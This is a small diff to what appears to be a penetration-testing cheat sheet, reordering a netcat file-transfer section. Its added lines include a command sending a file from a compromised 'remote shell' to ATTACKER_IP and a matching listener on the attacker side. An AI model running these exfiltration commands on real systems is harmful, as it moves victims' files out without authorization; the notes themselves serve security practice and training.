@@ -139,19 +139,15 @@ df -h                        # all disks and storage
 du -sh /tmp                  # how much spase
 ```
 # File Transfer on `Netcat`
-
-1. To download a file on the remote shell:
-
-```nc
-nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
-```
-
-2. To receive the file on the attacker machine:
-
+1. To receive the file on the attacker machine:
 ```nc
 nc -l ATTACKER_PORT > [output_file_path]
 ```
 
+2. To download a file on the remote shell:
+```nc
+nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
+```
 ---
 # magic numbers
 png
